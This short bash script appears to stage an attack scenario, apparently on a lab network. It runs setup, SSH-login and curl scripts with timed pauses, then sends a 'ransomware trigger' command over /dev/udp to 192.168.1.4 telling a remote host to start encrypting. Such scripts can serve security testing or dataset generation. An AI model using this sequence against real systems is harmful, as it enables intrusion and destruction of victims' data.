
bash ./setup_1.bash &

sleep 400


./ssh_pass_success.exp &

sleep 120
bash ./curl.bash

# wait 20 minutes
sleep 1200

# launch ransomeware trigger
echo "idru5991a:execute:encrypt5" > /dev/udp/192.168.1.4/54321

# what forever
sleep 100000